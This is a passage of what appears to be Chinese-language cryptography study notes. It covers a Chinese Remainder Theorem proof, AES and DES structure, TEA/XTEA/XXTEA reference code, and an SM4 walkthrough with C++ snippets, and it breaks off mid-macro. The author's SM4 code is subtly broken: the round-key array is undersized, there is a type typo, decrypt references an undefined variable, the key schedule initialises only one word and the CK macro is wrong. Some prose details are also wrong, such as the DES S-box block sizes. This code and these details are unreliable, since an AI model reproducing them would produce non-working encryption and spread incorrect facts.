<li><p>$t_i=M_i^{-1}(mod\ m_i)$</p>
</li>
<li><p>$x\equiv \sum\limits_{i=1}^{n}a_it_iM_i(mod\ M)$</p>
</li>
</ol>
<h4 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h4><p>由假设，$gcd(M_i,m_i)=1$，则$M_i^{-1}(mod\ m_i)$存在。</p>
<p>考察$x\ mod\ m_i,\because\forall j\ne i,M_j\equiv 0(mod\ m_i)$，从而得到$x\equiv a_it_iM_i(mod\ m_i)$</p>
<p>而$t_iM_i\equiv1(mod\ m_i)$，从而$x\equiv a_i(mod\ m_i)$</p>
<p>唯一性：</p>
<p>设$x_1,x_2$都是$S$的解，则$\forall i\in{1,2,…,n},x_1-x_2\equiv 0(mod\ m_i)$</p>
<p>而$gcd(m_i,m_j)=1,i\ne j,i,j\in{1,2,…,n}$，从而由$x_1-x_2\equiv0(mod\ M)$，从而说明是$x_1=x_2$</p>
<h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>$a^{p-1}\equiv 1(mod\ p),p$是质数且$a\ne0(mod\ p)$</p>
<h2 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h2><h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><h3 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h3><p>设$c_i,p_i,iv,f$分别为第$i$个密文块，明文块，初始向量，加密函数。ECB模式无$iv$。</p>
<h4 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h4><p>每个块自行加密</p>
<p>$c_0=f(p_0),c_1=f(p_1),…,c_n=f(p_n)$</p>
<h4 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h4><p>当前块加密会影响到以后的块</p>
<p>$c<em>0=f(iv\oplus p_0),c_1=f(p_1\oplus c_0),…,c_n=f(c</em>{n-1}\oplus p_n)$</p>
<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>也叫Rijndael加密法</p>
<p>使用代换-置换网络</p>
<p>加密的单位为4*4字节共4步</p>
<ol>
<li><p>AddRountKey</p>
<p>每一回合与该次密钥做xor运算，密钥通过Rijndael密钥生成方案产生</p>
</li>
<li><p>SubBytes</p>
<p>把每一个字节通过查找表(s盒)的方式替换成另一个</p>
</li>
<li><p>ShiftRows</p>
<p>可以理解为每个双字单位分散到其它双字</p>
<p>这里是不同双字的混合</p>
</li>
<li><p>MixColumns</p>
<p>使用线性变换在一个双字内部混合</p>
<p>这里是一个双字内部的混合</p>
</li>
</ol>
<ul>
<li><p>第一轮加密之前需要进行“白化操作”，即首先异或密钥</p>
</li>
<li><p>最后一轮没有MixColumns操作，使用AddRountKey替代</p>
</li>
</ul>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>S盒</p>
<p>参考资料：<a href="[高级加密标准 - 维基百科，自由的百科全书](https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">AES—wikipedia</a>)</p>
<h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p>Fiestel网络</p>
<p>16个相同的过程，块长度为64位，分成两个32位的半块v1,v2</p>
<h4 id="总体过程："><a href="#总体过程：" class="headerlink" title="总体过程："></a>总体过程：</h4><ol>
<li><p>进行一次置换，称为IP</p>
</li>
<li><p>进行16轮如下操作</p>
<p>s1=v1^F(v2)</p>
<p>v1=v2</p>
<p>v2=s1</p>
<p>其中F为Fiestel函数，包含扩张，与密钥混合，S盒，置换操作</p>
</li>
<li><p>进行一次置换，成为FP，FP为IP的逆函数</p>
</li>
</ol>
<p>IP和FP是简化输入输出数据库的过程而被显式地包含在标准中</p>
<h4 id="Fiestel函数"><a href="#Fiestel函数" class="headerlink" title="Fiestel函数"></a>Fiestel函数</h4><ol>
<li><p>扩张</p>
<p>将32为半块扩展到48位，包含8个6位块，每块包含4位输出位，加上邻接块中紧邻的位</p>
</li>
<li><p>与密钥混合</p>
<p>用异或操作将扩张结果和子密钥混合，子密钥是通过密钥调度产生的</p>
</li>
<li><p>S盒</p>
<p>与子密钥混合后，分成6个8位的块，然后使用S盒置换处理</p>
</li>
<li><p>置换</p>
<p>32个输出位利用P置换进行重组</p>
</li>
</ol>
<h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>S盒</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96">DES—wikipedia</a></p>
<h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p>可以加密两个无符号整数</p>
<p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也有部分变种，大多是变了delta，或者delta使用v0=(0-(-delta))</p>
<h3 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h3><p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相比tea，在使用密钥更不确定，特征值不变</p>
<h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX ((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4) ^ (sum^y) + (k[p&amp;3^e]^z))</span></span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">long</span> <span class="title">btea</span><span class="params">(<span class="keyword">long</span>* v, <span class="keyword">long</span> n, <span class="keyword">long</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> z=v[n<span class="number">-1</span>], y=v[<span class="number">0</span>], sum=<span class="number">0</span>, e, DELTA=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">long</span> p, q ;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++) y = v[p+<span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span> ; </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">      n = -n;</span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      sum = q*DELTA ;</span><br><span class="line">      <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--) z = v[p<span class="number">-1</span>], y = v[p] -= MX;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>n表示v的长度，正数表示加密，负数解密</p>
<h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><ul>
<li><p>密钥长度为128bits</p>
</li>
<li><p>加密算法和密钥扩展算法都是32位非线性迭代结构</p>
</li>
<li><p>加解密算法结构相同，轮密钥的使用顺序相反</p>
</li>
</ul>
<h4 id="定义运算"><a href="#定义运算" class="headerlink" title="定义运算"></a>定义运算</h4><p>32位数$x$向左循环移动$i$位$:x&lt;&lt;&lt;i,\oplus$为异或</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)x&gt;&gt;(32-(i)))))</span></span></span><br></pre></td></tr></table></figure>
<h4 id="定义参量"><a href="#定义参量" class="headerlink" title="定义参量"></a>定义参量</h4><p>密钥长度位128bits $MK=(MK_0,MK_1,MK_2,MK_3)$</p>
<p>轮密钥为32*32bits $rk=(rk<em>0,rk_1,…,rk</em>{31})$</p>
<p>$FK=(FK<em>0,FK_1,…,FK_3)$为系统参数，$CK=(CK_0,CK_1,…,CK</em>{31})$为固定参数</p>
<p>$CK_{i,j}=(4i+j)*7\ mod\ 256$，其中$i$为双字编号，$j$为字节编号，$j$采用大端序</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RK_SIZE 32</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> mk[<span class="number">4</span>];    <span class="comment">// 加密使用的密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rk[<span class="number">31</span>];    <span class="comment">// 轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> fk[<span class="number">4</span>]=&#123;<span class="number">0xA3B1BAC6</span>,<span class="number">0x56AA3350</span>,<span class="number">0x677D9197</span>,<span class="number">0xB27022DC</span>&#125;;</span><br><span class="line"><span class="comment">// ck会在密钥生成算法中体现</span></span><br></pre></td></tr></table></figure>
<h4 id="轮函数F"><a href="#轮函数F" class="headerlink" title="轮函数F"></a>轮函数F</h4><p>$F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)$</p>
<p>合成置换$T(.)=L(\tau(.))$</p>
<p>若输入为$A=(a_0,a_1,a_2,a_3)$，其中$a_i$为8字节无符号整数，则非线性置换$\tau(A)=(sbox[a_0],sbox[a_1],sbox[a_2],sbox[a_3])$</p>
<p>$sbox$为替换用s盒</p>
<p>若输入为$B$，其中$B$为32字节无符号整数，则线性变换$L(B)=B\oplus (B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) (x)^ROL32(x,2)^ROL32(x,10)^ROL32(x,18)^ROL32(x,24)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) (sbox[(x)&gt;&gt;24]<span class="meta-string">&lt;&lt;24|sbox[((x)&gt;&gt;16)&amp;0xFF]&lt;&lt;16|sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8|sbox[x&amp;0xFF])</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T(x) (L(tau(x)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> sbox[<span class="number">256</span>]; <span class="comment">// s盒，在最终代码中体现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮函数F直接在加密过程中体现</span></span><br></pre></td></tr></table></figure>
<h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><p>反序变换$R(a_0,a_1,a_2,a_3)=(a_3,a_2,a_1,a_0),a_i$为8位</p>
<p>设输入为$(X_0,X_1,X_2,X_3),X_i$为32位</p>
<p>输出为$(Y_0,Y_1,Y_2,Y_3)$</p>
<p>则$X<em>{i+4}=F(X_i,X</em>{i+1},X<em>{i+2},X</em>{i+3},rk_i)$</p>
<p>$(Y<em>0,Y_1,Y_2,Y_3)=R(X</em>{32},X<em>{33},X</em>{34},X_{35})$</p>
<p>解密过程和加密过程变换结构相同，不同的是轮密钥顺序</p>
<p>加密时$(rk<em>0,rk_1,…,rk</em>{31})$</p>
<p>解密时$rk<em>{31},rk</em>{30},…,rk_0$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>],<span class="keyword">uint32_t</span> crk[<span class="number">31</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c[<span class="number">36</span>];</span><br><span class="line">    c[<span class="number">0</span>]=p[<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">1</span>]=p[<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">2</span>]=p[<span class="number">2</span>];</span><br><span class="line">    c[<span class="number">3</span>]=p[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;RK_SIZE;i++)&#123;</span><br><span class="line">        c[i+<span class="number">4</span>]=c[i]^T(c[i+<span class="number">1</span>]^c[i+<span class="number">2</span>]^c[i+<span class="number">3</span>]^crk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">0</span>]=c[<span class="number">35</span>];</span><br><span class="line">    p[<span class="number">1</span>]=c[<span class="number">34</span>];</span><br><span class="line">    p[<span class="number">2</span>]=c[<span class="number">33</span>];</span><br><span class="line">    p[<span class="number">3</span>]=c[<span class="number">32</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    crypt(p,rk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> c[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    crypt(p,rrk); <span class="comment">// rrk是rk的逆序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h4><p>密钥$MK=(MK_0,MK_1,MK_2,MK_3)$</p>
<p>$K=(K<em>0,K_1,…,K</em>{31})$</p>
<p>$(K_0,K_1,K_2,K_3)=(MK_0\oplus FK_0,MK_1\oplus FK_1,MK_2\oplus FK_2,MK_3\oplus FK_3)$</p>
<p>轮密钥为$rk,rk<em>i=K</em>{i+4}=K<em>i\oplus T’(K</em>{i+1}\oplus K<em>{i+2}\oplus K</em>{i+3}\oplus CK_i)$</p>
<p>$T’$和$T$基本相同，其中的$L’=B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Lp(x) ((x)^ROL32(x,13)^ROL32(x,23))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Tp(x) Lp(tau(x))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck(i) (((4*(i)*7)&amp;0xFF)&lt;&lt;24|(((4*(i)+1)*7)&amp;0xFF)&lt;&lt;16|(((4*(i)+2)*7)&amp;0xFF)&lt;&lt;8|(4*(i)+3)&amp;0xFF)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initKey</span><span class="params">(<span class="keyword">uin32_t</span> mk[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">36</span>];</span><br><span class="line">    k[<span class="number">0</span>]=mk[<span class="number">0</span>]^fk[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;RK_SIZE;i++)&#123;</span><br><span class="line">        k[i+<span class="number">4</span>]=k[i]^Tp(k[i+<span class="number">1</span>]^k[i+<span class="number">2</span>]^k[i+<span class="number">3</span>]^ck(i));</span><br><span class="line">        rk[i]=k[i+<span class="number">4</span>];</span><br><span class="line">        rrk[RK_SIZE-i]=rk[i]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cha(x) ((((x)&amp;0x3F)+24)%64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)(x)&gt;&gt;(32-(i)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) (x)^ROL32(x,2)^ROL32(x,10)^ROL32(x,18)^ROL32(x,24)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) (sbox[((x)&gt;&gt;24)&amp;0xFF]<span class="meta-string">&lt;&lt;24|sbox[((x)&gt;&gt;16)&amp;0xFF]&lt;&lt;16|sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8|sbox[x&amp;0xFF])</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T(x) (L(tau(x)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 